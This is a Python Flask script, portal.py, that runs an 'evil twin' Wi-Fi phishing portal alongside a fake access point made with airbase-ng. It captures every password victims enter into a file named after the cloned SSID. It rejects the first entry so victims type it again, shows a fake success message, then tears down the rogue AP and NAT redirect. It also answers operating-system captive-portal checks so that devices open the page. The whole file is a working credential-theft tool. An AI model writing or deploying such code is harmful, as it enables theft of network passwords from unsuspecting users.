#portal.py
#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import time
from flask import (
    Flask, render_template, request,
    redirect, flash
)

app = Flask(
    __name__,
    template_folder='.',
    static_folder='.',
    static_url_path=''
)
app.secret_key = "supersecretkey-change-me"

# Defaults
HANDSHAKE_PATH = None
PORT = 8080

# Read arguments: [ handshake_path_or_empty, SSID_NAME ]
SSID_NAME = None
if len(sys.argv) > 1 and sys.argv[1]:
    HANDSHAKE_PATH = sys.argv[1]
if len(sys.argv) > 2:
    SSID_NAME = sys.argv[2]
else:
    SSID_NAME = "unknown_ssid"

LOG_FILE = f"{SSID_NAME}.txt"

# Clean up old log so each clone session starts at zero attempts
if os.path.exists(LOG_FILE):
    try:
        os.remove(LOG_FILE)
    except Exception:
        pass

def save_password(password: str):
    with open(LOG_FILE, "a") as f:
        f.write(password + "\n")

def teardown_ap():
    # Kill the fake AP process
    subprocess.run(["pkill", "-f", "airbase-ng"], check=False)
    # Kill DNS/DHCP
    subprocess.run(["pkill", "-f", "dnsmasq"], check=False)
    # Flush NAT rules (removes captive redirect)
    subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
    # Bring down and flush the at0 interface
    subprocess.run(["ip", "link", "set", "dev", "at0", "down"], check=False)
    subprocess.run(["ip", "addr", "flush", "dev", "at0"], check=False)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        pw = request.form.get("password", "").strip()
        if not pw:
            flash("Please enter a password", "warning")
            return render_template("portal.html")

        # 1) Save attempt
        save_password(pw)

        # 2) Count attempts by lines in LOG_FILE
        try:
            with open(LOG_FILE) as f:
                lines = f.read().splitlines()
        except FileNotFoundError:
            lines = []

        # 3) Branch on count
        if len(lines) == 1:
            flash("❌ Incorrect password, try again", "danger")
        elif len(lines) == 2:
            flash("✅ Successfully logged in!", "success")
            teardown_ap()
        else:
            # 3rd+ tries just keep showing success
            flash("✅ Successfully logged in!", "success")

        return render_template("portal.html")

    # GET: show form
    return render_template("portal.html")

# Redirect captive-style URLs back to login
@app.route("/connecttest.txt")
@app.route("/ncsi.txt")
def windows_ncsi():
    return redirect("/")

@app.route("/redirect", strict_slashes=False)
def windows_redirect():
    return redirect("/")

@app.route("/hotspot-detect.html")
def apple_captive():
    return redirect("/")

@app.route("/generate_204")
def google_captive():
    return redirect("/")

def find_process_on_port(port):
    try:
        out = subprocess.check_output(
            ["lsof", "-i", f":{port}"], stderr=subprocess.DEVNULL, text=True
        )
        lines = out.splitlines()
        if len(lines) > 1:
            return int(lines[1].split()[1])
    except Exception:
        pass
    return None

def kill_process(pid):
    try:
        os.kill(pid, subprocess.signal.SIGTERM)
        time.sleep(1)
    except Exception:
        pass

def check_port_available(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("0.0.0.0", port)) != 0

if __name__ == "__main__":
    if HANDSHAKE_PATH:
        print(f"[+] Using handshake file: {HANDSHAKE_PATH}")
    else:
        print("[!] No handshake specified; only logging passwords.")

    # Kill any running service on PORT
    pid = find_process_on_port(PORT)
    if pid:
        kill_process(pid)

    if not check_port_available(PORT):
        print(f"[!] Port {PORT} still in use. Exiting.")
        sys.exit(1)

    app.run(host="0.0.0.0", port=PORT, debug=False)
